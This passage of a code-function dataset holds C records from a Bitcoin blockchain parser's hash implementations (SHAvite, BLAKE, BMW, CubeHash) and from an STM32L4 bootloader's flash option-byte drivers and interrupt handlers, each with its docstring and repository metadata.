^= rk17;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\tKEY_EXPAND_ELT(rk18, rk19, rk1A, rk1B);\n\t\trk18 ^= rk14;\n\t\trk19 ^= rk15;\n\t\trk1A ^= rk16;\n\t\trk1B ^= rk17;\n\t\tx0 ^= rk18;\n\t\tx1 ^= rk19;\n\t\tx2 ^= rk1A;\n\t\tx3 ^= rk1B;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\tKEY_EXPAND_ELT(rk1C, rk1D, rk1E, rk1F);\n\t\trk1C ^= rk18;\n\t\trk1D ^= rk19;\n\t\trk1E ^= rk1A;\n\t\trk1F ^= rk1B;\n\t\tx0 ^= rk1C;\n\t\tx1 ^= rk1D;\n\t\tx2 ^= rk1E;\n\t\tx3 ^= rk1F;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\tpC ^= x0;\n\t\tpD ^= x1;\n\t\tpE ^= x2;\n\t\tpF ^= x3;\n\t\t/* round 4, 8, 12 */\n\t\trk00 ^= rk19;\n\t\tx0 = p4 ^ rk00;\n\t\trk01 ^= rk1A;\n\t\tx1 = p5 ^ rk01;\n\t\trk02 ^= rk1B;\n\t\tx2 = p6 ^ rk02;\n\t\trk03 ^= rk1C;\n\t\tx3 = p7 ^ rk03;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\trk04 ^= rk1D;\n\t\tx0 ^= rk04;\n\t\trk05 ^= rk1E;\n\t\tx1 ^= rk05;\n\t\trk06 ^= rk1F;\n\t\tx2 ^= rk06;\n\t\trk07 ^= rk00;\n\t\tx3 ^= rk07;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\trk08 ^= rk01;\n\t\tx0 ^= rk08;\n\t\trk09 ^= rk02;\n\t\tx1 ^= rk09;\n\t\trk0A ^= rk03;\n\t\tx2 ^= rk0A;\n\t\trk0B ^= rk04;\n\t\tx3 ^= rk0B;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\trk0C ^= rk05;\n\t\tx0 ^= rk0C;\n\t\trk0D ^= rk06;\n\t\tx1 ^= rk0D;\n\t\trk0E ^= rk07;\n\t\tx2 ^= rk0E;\n\t\trk0F ^= rk08;\n\t\tx3 ^= rk0F;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\tp0 ^= x0;\n\t\tp1 ^= x1;\n\t\tp2 ^= x2;\n\t\tp3 ^= x3;\n\t\trk10 ^= rk09;\n\t\tx0 = pC ^ rk10;\n\t\trk11 ^= rk0A;\n\t\tx1 = pD ^ rk11;\n\t\trk12 ^= rk0B;\n\t\tx2 = pE ^ rk12;\n\t\trk13 ^= rk0C;\n\t\tx3 = pF ^ rk13;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\trk14 ^= rk0D;\n\t\tx0 ^= rk14;\n\t\trk15 ^= rk0E;\n\t\tx1 ^= rk15;\n\t\trk16 ^= rk0F;\n\t\tx2 ^= rk16;\n\t\trk17 ^= rk10;\n\t\tx3 ^= rk17;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\trk18 ^= rk11;\n\t\tx0 ^= rk18;\n\t\trk19 ^= rk12;\n\t\tx1 ^= rk19;\n\t\trk1A ^= rk13;\n\t\tx2 ^= rk1A;\n\t\trk1B ^= rk14;\n\t\tx3 ^= rk1B;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\trk1C ^= rk15;\n\t\tx0 ^= rk1C;\n\t\trk1D ^= rk16;\n\t\tx1 ^= rk1D;\n\t\trk1E ^= rk17;\n\t\tx2 ^= rk1E;\n\t\trk1F ^= rk18;\n\t\tx3 ^= rk1F;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\tp8 ^= x0;\n\t\tp9 ^= x1;\n\t\tpA ^= x2;\n\t\tpB ^= x3;\n\t}\n\t/* round 13 */\n\tKEY_EXPAND_ELT(rk00, rk01, rk02, rk03);\n\trk00 ^= rk1C;\n\trk01 ^= rk1D;\n\trk02 ^= rk1E;\n\trk03 ^= rk1F;\n\tx0 = p0 ^ rk00;\n\tx1 = p1 ^ rk01;\n\tx2 = p2 ^ rk02;\n\tx3 = p3 ^ rk03;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tKEY_EXPAND_ELT(rk04, rk05, rk06, rk07);\n\trk04 ^= rk00;\n\trk05 ^= rk01;\n\trk06 ^= rk02;\n\trk07 ^= rk03;\n\tx0 ^= rk04;\n\tx1 ^= rk05;\n\tx2 ^= rk06;\n\tx3 ^= rk07;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tKEY_EXPAND_ELT(rk08, rk09, rk0A, rk0B);\n\trk08 ^= rk04;\n\trk09 ^= rk05;\n\trk0A ^= rk06;\n\trk0B ^= rk07;\n\tx0 ^= rk08;\n\tx1 ^= rk09;\n\tx2 ^= rk0A;\n\tx3 ^= rk0B;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tKEY_EXPAND_ELT(rk0C, rk0D, rk0E, rk0F);\n\trk0C ^= rk08;\n\trk0D ^= rk09;\n\trk0E ^= rk0A;\n\trk0F ^= rk0B;\n\tx0 ^= rk0C;\n\tx1 ^= rk0D;\n\tx2 ^= rk0E;\n\tx3 ^= rk0F;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tpC ^= x0;\n\tpD ^= x1;\n\tpE ^= x2;\n\tpF ^= x3;\n\tKEY_EXPAND_ELT(rk10, rk11, rk12, rk13);\n\trk10 ^= rk0C;\n\trk11 ^= rk0D;\n\trk12 ^= rk0E;\n\trk13 ^= rk0F;\n\tx0 = p8 ^ rk10;\n\tx1 = p9 ^ rk11;\n\tx2 = pA ^ rk12;\n\tx3 = pB ^ rk13;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tKEY_EXPAND_ELT(rk14, rk15, rk16, rk17);\n\trk14 ^= rk10;\n\trk15 ^= rk11;\n\trk16 ^= rk12;\n\trk17 ^= rk13;\n\tx0 ^= rk14;\n\tx1 ^= rk15;\n\tx2 ^= rk16;\n\tx3 ^= rk17;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tKEY_EXPAND_ELT(rk18, rk19, rk1A, rk1B);\n\trk18 ^= rk14 ^ sc->count1;\n\trk19 ^= rk15 ^ sc->count0;\n\trk1A ^= rk16 ^ sc->count3;\n\trk1B ^= rk17 ^ SPH_T32(~sc->count2);\n\tx0 ^= rk18;\n\tx1 ^= rk19;\n\tx2 ^= rk1A;\n\tx3 ^= rk1B;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tKEY_EXPAND_ELT(rk1C, rk1D, rk1E, rk1F);\n\trk1C ^= rk18;\n\trk1D ^= rk19;\n\trk1E ^= rk1A;\n\trk1F ^= rk1B;\n\tx0 ^= rk1C;\n\tx1 ^= rk1D;\n\tx2 ^= rk1E;\n\tx3 ^= rk1F;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tp4 ^= x0;\n\tp5 ^= x1;\n\tp6 ^= x2;\n\tp7 ^= x3;\n\tsc->h[0x0] ^= p8;\n\tsc->h[0x1] ^= p9;\n\tsc->h[0x2] ^= pA;\n\tsc->h[0x3] ^= pB;\n\tsc->h[0x4] ^= pC;\n\tsc->h[0x5] ^= pD;\n\tsc->h[0x6] ^= pE;\n\tsc->h[0x7] ^= pF;\n\tsc->h[0x8] ^= p0;\n\tsc->h[0x9] ^= p1;\n\tsc->h[0xA] ^= p2;\n\tsc->h[0xB] ^= p3;\n\tsc->h[0xC] ^= p4;\n\tsc->h[0xD] ^= p5;\n\tsc->h[0xE] ^= p6;\n\tsc->h[0xF] ^= p7;\n}", "path": "blockparser/h9/shavite.c", "commit_date": "2014-08-20 00:00:00", "repo_name": "znort987/blockparser", "stars": 529, "license": "None", "language": "c", "size": 1036}
{"docstring": "/* see sph_bmw.h */\n", "func_signal": "void\nsph_bmw512_addbits_and_close(void *cc, unsigned ub, unsigned n, void *dst)", "code": "{\n\tbmw64_close(cc, ub, n, dst, 8);\n\tsph_bmw512_init(cc);\n}", "path": "blockparser/h9/bmw.c", "commit_date": "2014-08-20 00:00:00", "repo_name": "znort987/blockparser", "stars": 529, "license": "None", "language": "c", "size": 1036}
{"docstring": "/* see sph_blake.h */\n", "func_signal": "void\nsph_blake512_addbits_and_close(void *cc, unsigned ub, unsigned n, void *dst)", "code": "{\n\tblake64_close(cc, ub, n, dst, 8);\n\tsph_blake512_init(cc);\n}", "path": "blockparser/h9/blake.c", "commit_date": "2014-08-20 00:00:00", "repo_name": "znort987/blockparser", "stars": 529, "license": "None", "language": "c", "size": 1036}
{"docstring": "/* see sph_blake.h */\n", "func_signal": "void\nsph_blake256_addbits_and_close(void *cc, unsigned ub, unsigned n, void *dst)", "code": "{\n\tblake32_close(cc, ub, n, dst, 8);\n\tsph_blake256_init(cc);\n}", "path": "blockparser/h9/blake.c", "commit_date": "2014-08-20 00:00:00", "repo_name": "znort987/blockparser", "stars": 529, "license": "None", "language": "c", "size": 1036}
{"docstring": "/* see sph_cubehash.h */\n", "func_signal": "void\nsph_cubehash384_addbits_and_close(void *cc, unsigned ub, unsigned n, void *dst)", "code": "{\n\tcubehash_close(cc, ub, n, dst, 12);\n\tsph_cubehash384_init(cc);\n}", "path": "blockparser/h9/cubehash.c", "commit_date": "2014-08-20 00:00:00", "repo_name": "znort987/blockparser", "stars": 529, "license": "None", "language": "c", "size": 1036}
{"docstring": "/* see sph_cubehash.h */\n", "func_signal": "void\nsph_cubehash224_addbits_and_close(void *cc, unsigned ub, unsigned n, void *dst)", "code": "{\n\tcubehash_close(cc, ub, n, dst, 7);\n\tsph_cubehash224_init(cc);\n}", "path": "blockparser/h9/cubehash.c", "commit_date": "2014-08-20 00:00:00", "repo_name": "znort987/blockparser", "stars": 529, "license": "None", "language": "c", "size": 1036}
{"docstring": "/* see sph_shavite.h */\n", "func_signal": "void\nsph_shavite224_addbits_and_close(void *cc, unsigned ub, unsigned n, void *dst)", "code": "{\n\tshavite_small_close(cc, ub, n, dst, 7);\n\tshavite_small_init(cc, IV224);\n}", "path": "blockparser/h9/shavite.c", "commit_date": "2014-08-20 00:00:00", "repo_name": "znort987/blockparser", "stars": 529, "license": "None", "language": "c", "size": 1036}
{"docstring": "/* see sph_shavite.h */\n", "func_signal": "void\nsph_shavite512_addbits_and_close(void *cc, unsigned ub, unsigned n, void *dst)", "code": "{\n\tshavite_big_close(cc, ub, n, dst, 16);\n\tshavite_big_init(cc, IV512);\n}", "path": "blockparser/h9/shavite.c", "commit_date": "2014-08-20 00:00:00", "repo_name": "znort987/blockparser", "stars": 529, "license": "None", "language": "c", "size": 1036}
{"docstring": "/* see sph_cubehash.h */\n", "func_signal": "void\nsph_cubehash256_addbits_and_close(void *cc, unsigned ub, unsigned n, void *dst)", "code": "{\n\tcubehash_close(cc, ub, n, dst, 8);\n\tsph_cubehash256_init(cc);\n}", "path": "blockparser/h9/cubehash.c", "commit_date": "2014-08-20 00:00:00", "repo_name": "znort987/blockparser", "stars": 529, "license": "None", "language": "c", "size": 1036}
{"docstring": "/* see sph_shavite.h */\n", "func_signal": "void\nsph_shavite224_close(void *cc, void *dst)", "code": "{\n\tshavite_small_close(cc, 0, 0, dst, 7);\n\tshavite_small_init(cc, IV224);\n}", "path": "blockparser/h9/shavite.c", "commit_date": "2014-08-20 00:00:00", "repo_name": "znort987/blockparser", "stars": 529, "license": "None", "language": "c", "size": 1036}
{"docstring": "/* see sph_bmw.h */\n", "func_signal": "void\nsph_bmw256_addbits_and_close(void *cc, unsigned ub, unsigned n, void *dst)", "code": "{\n\tbmw32_close(cc, ub, n, dst, 8);\n\tsph_bmw256_init(cc);\n}", "path": "blockparser/h9/bmw.c", "commit_date": "2014-08-20 00:00:00", "repo_name": "znort987/blockparser", "stars": 529, "license": "None", "language": "c", "size": 1036}
{"docstring": "/* see sph_shavite.h */\n", "func_signal": "void\nsph_shavite256_addbits_and_close(void *cc, unsigned ub, unsigned n, void *dst)", "code": "{\n\tshavite_small_close(cc, ub, n, dst, 8);\n\tshavite_small_init(cc, IV256);\n}", "path": "blockparser/h9/shavite.c", "commit_date": "2014-08-20 00:00:00", "repo_name": "znort987/blockparser", "stars": 529, "license": "None", "language": "c", "size": 1036}
{"docstring": "/**\n  * @brief  Flush the instruction and data caches.\n  * @retval None\n  */\n", "func_signal": "void FLASH_FlushCaches(void)", "code": "{\n  /* Flush instruction cache  */\n  if((pFlash.CacheToReactivate == FLASH_CACHE_ICACHE_ENABLED) || \n     (pFlash.CacheToReactivate == FLASH_CACHE_ICACHE_DCACHE_ENABLED))\n  {\n    /* Reset instruction cache */\n    __HAL_FLASH_INSTRUCTION_CACHE_RESET();\n    /* Enable instruction cache */\n    __HAL_FLASH_INSTRUCTION_CACHE_ENABLE();\n  }\n  \n  /* Flush data cache */\n  if((pFlash.CacheToReactivate == FLASH_CACHE_DCACHE_ENABLED) || \n     (pFlash.CacheToReactivate == FLASH_CACHE_ICACHE_DCACHE_ENABLED))\n  {\n    /* Reset data cache */\n    __HAL_FLASH_DATA_CACHE_RESET();\n    /* Enable data cache */\n    __HAL_FLASH_DATA_CACHE_ENABLE();\n  }\n  \n  /* Reset internal variable */\n  pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;\n}", "path": "stm32-bootloader/drivers/STM32L4xx_HAL_Driver/Src/stm32l4xx_hal_flash_ex.c", "commit_date": "2019-09-02 00:00:00", "repo_name": "akospasztor/stm32-bootloader", "stars": 839, "license": "other", "language": "c", "size": 2598}
{"docstring": "/**\n * @brief This function handles Hard fault interrupt.\n */\n", "func_signal": "void HardFault_Handler(void)", "code": "{\n    while(1)\n    {\n    }\n}", "path": "stm32-bootloader/projects/STM32L476-CustomHw/source/stm32l4xx_it.c", "commit_date": "2020-03-19 00:00:00", "repo_name": "akospasztor/stm32-bootloader", "stars": 839, "license": "other", "language": "c", "size": 2598}
{"docstring": "/**\n  * @brief  Get the Option bytes configuration.\n  * @param  pOBInit: pointer to an FLASH_OBInitStruct structure that contains the \n  *                  configuration information.\n  * @note   The fields pOBInit->WRPArea and pOBInit->PCROPConfig should indicate \n  *         which area is requested for the WRP and PCROP, else no information will be returned\n  * \n  * @retval None\n  */\n", "func_signal": "void HAL_FLASHEx_OBGetConfig(FLASH_OBProgramInitTypeDef *pOBInit)", "code": "{\n  pOBInit->OptionType = (OPTIONBYTE_RDP | OPTIONBYTE_USER);\n\n#if defined (STM32L471xx) || defined (STM32L475xx) || defined (STM32L476xx) || defined (STM32L485xx) || defined (STM32L486xx) || \\\n    defined (STM32L496xx) || defined (STM32L4A6xx) || \\\n    defined (STM32L4R5xx) || defined (STM32L4R7xx) || defined (STM32L4R9xx) || defined (STM32L4S5xx) || defined (STM32L4S7xx) || defined (STM32L4S9xx)\n  if((pOBInit->WRPArea == OB_WRPAREA_BANK1_AREAA) || (pOBInit->WRPArea == OB_WRPAREA_BANK1_AREAB) ||\n     (pOBInit->WRPArea == OB_WRPAREA_BANK2_AREAA) || (pOBInit->WRPArea == OB_WRPAREA_BANK2_AREAB))\n#else\n  if((pOBInit->WRPArea == OB_WRPAREA_BANK1_AREAA) || (pOBInit->WRPArea == OB_WRPAREA_BANK1_AREAB))\n#endif\n  {\n    pOBInit->OptionType |= OPTIONBYTE_WRP;\n    /* Get write protection on the selected area */\n    FLASH_OB_GetWRP(pOBInit->WRPArea, &(pOBInit->WRPStartOffset), &(pOBInit->WRPEndOffset));\n  }\n  \n  /* Get Read protection level */\n  pOBInit->RDPLevel = FLASH_OB_GetRDP();\n  \n  /* Get the user option bytes */\n  pOBInit->USERConfig = FLASH_OB_GetUser();\n  \n#if defined (STM32L471xx) || defined (STM32L475xx) || defined (STM32L476xx) || defined (STM32L485xx) || defined (STM32L486xx) || \\\n    defined (STM32L496xx) || defined (STM32L4A6xx) || \\\n    defined (STM32L4R5xx) || defined (STM32L4R7xx) || defined (STM32L4R9xx) || defined (STM32L4S5xx) || defined (STM32L4S7xx) || defined (STM32L4S9xx)\n  if((pOBInit->PCROPConfig == FLASH_BANK_1) || (pOBInit->PCROPConfig == FLASH_BANK_2))\n#else\n  if(pOBInit->PCROPConfig == FLASH_BANK_1)\n#endif    \n  {\n    pOBInit->OptionType |= OPTIONBYTE_PCROP;\n    /* Get the Proprietary code readout protection */\n    FLASH_OB_GetPCROP(&(pOBInit->PCROPConfig), &(pOBInit->PCROPStartAddr), &(pOBInit->PCROPEndAddr));\n  }\n}", "path": "stm32-bootloader/drivers/STM32L4xx_HAL_Driver/Src/stm32l4xx_hal_flash_ex.c", "commit_date": "2019-09-02 00:00:00", "repo_name": "akospasztor/stm32-bootloader", "stars": 839, "license": "other", "language": "c", "size": 2598}
{"docstring": "/**\n  * @brief  Program Option bytes.\n  * @param  pOBInit: pointer to an FLASH_OBInitStruct structure that\n  *         contains the configuration information for the programming.\n  * \n  * @retval HAL Status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_FLASHEx_OBProgram(FLASH_OBProgramInitTypeDef *pOBInit)", "code": "{\n  HAL_StatusTypeDef status = HAL_OK;\n  \n  /* Process Locked */\n  __HAL_LOCK(&pFlash);\n\n  /* Check the parameters */\n  assert_param(IS_OPTIONBYTE(pOBInit->OptionType));\n  \n  pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;\n\n  /* Write protection configuration */\n  if((pOBInit->OptionType & OPTIONBYTE_WRP) != RESET)\n  {\n    /* Configure of Write protection on the selected area */\n    if(FLASH_OB_WRPConfig(pOBInit->WRPArea, pOBInit->WRPStartOffset, pOBInit->WRPEndOffset) != HAL_OK)\n    {\n      status = HAL_ERROR;\n    }\n    \n  }\n  \n  /* Read protection configuration */\n  if((pOBInit->OptionType & OPTIONBYTE_RDP) != RESET)\n  {\n    /* Configure the Read protection level */\n    if(FLASH_OB_RDPConfig(pOBInit->RDPLevel) != HAL_OK)\n    {\n      status = HAL_ERROR;\n    }\n  }\n  \n  /* User Configuration */\n  if((pOBInit->OptionType & OPTIONBYTE_USER) != RESET)\n  {\n    /* Configure the user option bytes */\n    if(FLASH_OB_UserConfig(pOBInit->USERType, pOBInit->USERConfig) != HAL_OK)\n    {\n      status = HAL_ERROR;\n    }\n  }\n  \n  /* PCROP Configuration */\n  if((pOBInit->OptionType & OPTIONBYTE_PCROP) != RESET)\n  {\n    if (pOBInit->PCROPStartAddr != pOBInit->PCROPEndAddr)\n    {\n      /* Configure the Proprietary code readout protection */\n      if(FLASH_OB_PCROPConfig(pOBInit->PCROPConfig, pOBInit->PCROPStartAddr, pOBInit->PCROPEndAddr) != HAL_OK)\n      {\n        status = HAL_ERROR;\n      }\n    }\n  }\n\n  /* Process Unlocked */\n  __HAL_UNLOCK(&pFlash);\n\n  return status;\n}", "path": "stm32-bootloader/drivers/STM32L4xx_HAL_Driver/Src/stm32l4xx_hal_flash_ex.c", "commit_date": "2019-09-02 00:00:00", "repo_name": "akospasztor/stm32-bootloader", "stars": 839, "license": "other", "language": "c", "size": 2598}
{"docstring": "/**\n  * @brief  Return the FLASH Write Protection Option Bytes value.\n  *\n  * @param PCROPConfig [inout]: specifies the configuration (Bank to be configured and PCROP_RDP option).\n  *          This parameter must be a combination of FLASH_BANK_1 or FLASH_BANK_2 \n  *          with OB_PCROP_RDP_NOT_ERASE or OB_PCROP_RDP_ERASE\n  *\n  * @param PCROPStartAddr [out]: specifies the address where to copied the start address \n  *                         of the Proprietary code readout protection\n  *\n  * @param PCROPEndAddr [out]: specifies the address where to copied the end address of \n  *                       the Proprietary code readout protection\n  *\n  * @retval None\n  */\n", "func_signal": "static void FLASH_OB_GetPCROP(uint32_t * PCROPConfig, uint32_t * PCROPStartAddr, uint32_t * PCROPEndAddr)", "code": "{\n  uint32_t reg_value = 0;\n  uint32_t bank1_addr;\n#if defined (STM32L471xx) || defined (STM32L475xx) || defined (STM32L476xx) || defined (STM32L485xx) || defined (STM32L486xx) || \\\n    defined (STM32L496xx) || defined (STM32L4A6xx) || \\\n    defined (STM32L4R5xx) || defined (STM32L4R7xx) || defined (STM32L4R9xx) || defined (STM32L4S5xx) || defined (STM32L4S7xx) || defined (STM32L4S9xx)\n  uint32_t bank2_addr;\n#endif\n  \n#if defined (STM32L471xx) || defined (STM32L475xx) || defined (STM32L476xx) || defined (STM32L485xx) || defined (STM32L486xx) || \\\n    defined (STM32L496xx) || defined (STM32L4A6xx) || \\\n    defined (STM32L4R5xx) || defined (STM32L4R7xx) || defined (STM32L4R9xx) || defined (STM32L4S5xx) || defined (STM32L4S7xx) || defined (STM32L4S9xx)\n  /* Get the information about the bank swapping */\n  if (READ_BIT(SYSCFG->MEMRMP, SYSCFG_MEMRMP_FB_MODE) == 0)\n  {\n    bank1_addr = FLASH_BASE;\n    bank2_addr = FLASH_BASE + FLASH_BANK_SIZE;\n  }\n  else\n  {\n    bank1_addr = FLASH_BASE + FLASH_BANK_SIZE;\n    bank2_addr = FLASH_BASE;\n  }\n#else\n  bank1_addr = FLASH_BASE;\n#endif\n  \n#if defined (STM32L4R5xx) || defined (STM32L4R7xx) || defined (STM32L4R9xx) || defined (STM32L4S5xx) || defined (STM32L4S7xx) || defined (STM32L4S9xx)\n  if (READ_BIT(FLASH->OPTR, FLASH_OPTR_DBANK) == RESET)\n  {\n    if(((*PCROPConfig) & FLASH_BANK_BOTH) == FLASH_BANK_1)\n    {\n      reg_value       = (READ_REG(FLASH->PCROP1SR) & FLASH_PCROP1SR_PCROP1_STRT);\n      *PCROPStartAddr = (reg_value << 4) + FLASH_BASE;\n      \n      reg_value     = (READ_REG(FLASH->PCROP1ER) & FLASH_PCROP1ER_PCROP1_END);\n      *PCROPEndAddr = (reg_value << 4) + FLASH_BASE;\n    }\n    else if(((*PCROPConfig) & FLASH_BANK_BOTH) == FLASH_BANK_2)\n    {\n      reg_value       = (READ_REG(FLASH->PCROP2SR) & FLASH_PCROP2SR_PCROP2_STRT);\n      *PCROPStartAddr = (reg_value << 4) + FLASH_BASE;\n      \n      reg_value     = (READ_REG(FLASH->PCROP2ER) & FLASH_PCROP2ER_PCROP2_END);\n      *PCROPEndAddr = (reg_value << 4) + FLASH_BASE;\n    }\n  }\n  else\n#endif\n  {\n    if(((*PCROPConfig) & FLASH_BANK_BOTH) == FLASH_BANK_1)\n    {\n      reg_value       = (READ_REG(FLASH->PCROP1SR) & FLASH_PCROP1SR_PCROP1_STRT);\n      *PCROPStartAddr = (reg_value << 3) + bank1_addr;\n      \n      reg_value     = (READ_REG(FLASH->PCROP1ER) & FLASH_PCROP1ER_PCROP1_END);\n      *PCROPEndAddr = (reg_value << 3) + bank1_addr;\n    }\n#if defined (STM32L471xx) || defined (STM32L475xx) || defined (STM32L476xx) || defined (STM32L485xx) || defined (STM32L486xx) || \\\n    defined (STM32L496xx) || defined (STM32L4A6xx) || \\\n    defined (STM32L4R5xx) || defined (STM32L4R7xx) || defined (STM32L4R9xx) || defined (STM32L4S5xx) || defined (STM32L4S7xx) || defined (STM32L4S9xx)\n    else if(((*PCROPConfig) & FLASH_BANK_BOTH) == FLASH_BANK_2)\n    {\n      reg_value       = (READ_REG(FLASH->PCROP2SR) & FLASH_PCROP2SR_PCROP2_STRT);\n      *PCROPStartAddr = (reg_value << 3) + bank2_addr;\n      \n      reg_value     = (READ_REG(FLASH->PCROP2ER) & FLASH_PCROP2ER_PCROP2_END);\n      *PCROPEndAddr = (reg_value << 3) + bank2_addr;\n    }\n#endif\n  }\n  \n  *PCROPConfig |= (READ_REG(FLASH->PCROP1ER) & FLASH_PCROP1ER_PCROP_RDP);\n}", "path": "stm32-bootloader/drivers/STM32L4xx_HAL_Driver/Src/stm32l4xx_hal_flash_ex.c", "commit_date": "2019-09-02 00:00:00", "repo_name": "akospasztor/stm32-bootloader", "stars": 839, "license": "other", "language": "c", "size": 2598}
{"docstring": "/**\n  * @brief  Set the read protection level.\n  *    \n  * @note   To configure the RDP level, the option lock bit OPTLOCK must be \n  *         cleared with the call of the HAL_FLASH_OB_Unlock() function.\n  * @note   To validate the RDP level, the option bytes must be reloaded \n  *         through the call of the HAL_FLASH_OB_Launch() function.\n  * @note   !!! Warning : When enabling OB_RDP level 2 it's no more possible \n  *         to go back to level 1 or 0 !!!\n  *    \n  * @param  RDPLevel: specifies the read protection level.\n  *         This parameter can be one of the following values:\n  *            @arg OB_RDP_LEVEL_0: No protection\n  *            @arg OB_RDP_LEVEL_1: Read protection of the memory\n  *            @arg OB_RDP_LEVEL_2: Full chip protection\n  *   \n  * @retval HAL status\n  */\n", "func_signal": "static HAL_StatusTypeDef FLASH_OB_RDPConfig(uint32_t RDPLevel)", "code": "{\n  HAL_StatusTypeDef status = HAL_OK;\n\n  /* Check the parameters */\n  assert_param(IS_OB_RDP_LEVEL(RDPLevel));\n    \n  /* Wait for last operation to be completed */\n  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);\n\n  if(status == HAL_OK)\n  { \n    /* Configure the RDP level in the option bytes register */\n    MODIFY_REG(FLASH->OPTR, FLASH_OPTR_RDP, RDPLevel);\n    \n    /* Set OPTSTRT Bit */\n    SET_BIT(FLASH->CR, FLASH_CR_OPTSTRT);\n    \n    /* Wait for last operation to be completed */\n    status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);\n\n    /* If the option byte program operation is completed, disable the OPTSTRT Bit */\n    CLEAR_BIT(FLASH->CR, FLASH_CR_OPTSTRT);\n  }\n\n  return status;            \n}", "path": "stm32-bootloader/drivers/STM32L4xx_HAL_Driver/Src/stm32l4xx_hal_flash_ex.c", "commit_date": "2019-09-02 00:00:00", "repo_name": "akospasztor/stm32-bootloader", "stars": 839, "license": "other", "language": "c", "size": 2598}
{"docstring": "/**\n * @brief  This function is executed in case of error occurrence.\n * @param  None\n * @retval None\n */\n", "func_signal": "void Error_Handler(void)", "code": "{\n    while(1)\n    {\n        LED_R_TG();\n        HAL_Delay(500);\n    }\n}", "path": "stm32-bootloader/projects/STM32L496-CustomHw/source/main.c", "commit_date": "2020-03-19 00:00:00", "repo_name": "akospasztor/stm32-bootloader", "stars": 839, "license": "other", "language": "c", "size": 2598}
{"docstring": "/*** GPIO Configuration ***/\n", "func_signal": "void GPIO_Init(void)", "code": "{\n    GPIO_InitTypeDef GPIO_InitStruct;\n\n    __HAL_RCC_GPIOB_CLK_ENABLE();\n    __HAL_RCC_GPIOC_CLK_ENABLE();\n\n    /* Configure GPIO pin output levels */\n    HAL_GPIO_WritePin(LED_G_Port, LED_G_Pin, GPIO_PIN_RESET);\n    HAL_GPIO_WritePin(LED_Y_Port, LED_Y_Pin, GPIO_PIN_RESET);\n    HAL_GPIO_WritePin(LED_R_Port, LED_R_Pin, GPIO_PIN_RESET);\n    HAL_GPIO_WritePin(SD_PWR_Port, SD_PWR_Pin, GPIO_PIN_SET);\n\n    /* LED_G_Pin, LED_Y_Pin, LED_R_Pin */\n    GPIO_InitStruct.Mode  = GPIO_MODE_OUTPUT_PP;\n    GPIO_InitStruct.Pull  = GPIO_NOPULL;\n    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;\n\n    GPIO_InitStruct.Pin = LED_G_Pin;\n    HAL_GPIO_Init(LED_G_Port, &GPIO_InitStruct);\n\n    GPIO_InitStruct.Pin = LED_Y_Pin;\n    HAL_GPIO_Init(LED_Y_Port, &GPIO_InitStruct);\n\n    GPIO_InitStruct.Pin = LED_R_Pin;\n    HAL_GPIO_Init(LED_R_Port, &GPIO_InitStruct);\n\n    /* SD Card Power Pin */\n    GPIO_InitStruct.Pin   = SD_PWR_Pin;\n    GPIO_InitStruct.Mode  = GPIO_MODE_OUTPUT_PP;\n    GPIO_InitStruct.Pull  = GPIO_NOPULL;\n    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;\n    HAL_GPIO_Init(SD_PWR_Port, &GPIO_InitStruct);\n\n    /* User Button */\n    GPIO_InitStruct.Pin   = BTN_Pin;\n    GPIO_InitStruct.Mode  = GPIO_MODE_INPUT;\n    GPIO_InitStruct.Pull  = GPIO_PULLUP;\n    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;\n    HAL_GPIO_Init(BTN_Port, &GPIO_InitStruct);\n}", "path": "stm32-bootloader/projects/STM32L496-CustomHw/source/main.c", "commit_date": "2020-03-19 00:00:00", "repo_name": "akospasztor/stm32-bootloader", "stars": 839, "license": "other", "language": "c", "size": 2598}
{"docstring": "/**\n * @brief DMA2 Channel5 ISR\n * @note  SDMMC DMA Tx, Rx\n */\n", "func_signal": "void DMA2_Channel5_IRQHandler(void)", "code": "{\n    if((hsd1.Context == (SD_CONTEXT_DMA | SD_CONTEXT_READ_SINGLE_BLOCK)) ||\n       (hsd1.Context == (SD_CONTEXT_DMA | SD_CONTEXT_READ_MULTIPLE_BLOCK)))\n    {\n        HAL_DMA_IRQHandler(hsd1.hdmarx);\n    }\n    else if((hsd1.Context ==\n             (SD_CONTEXT_DMA | SD_CONTEXT_WRITE_SINGLE_BLOCK)) ||\n            (hsd1.Context ==\n             (SD_CONTEXT_DMA | SD_CONTEXT_WRITE_MULTIPLE_BLOCK)))\n    {\n        HAL_DMA_IRQHandler(hsd1.hdmatx);\n    }\n}", "path": "stm32-bootloader/projects/STM32L476-CustomHw/source/stm32l4xx_it.c", "commit_date": "2020-03-19 00:00:00", "repo_name": "akospasztor/stm32-bootloader", "stars": 839, "license": "other", "language": "c", "size": 2598}
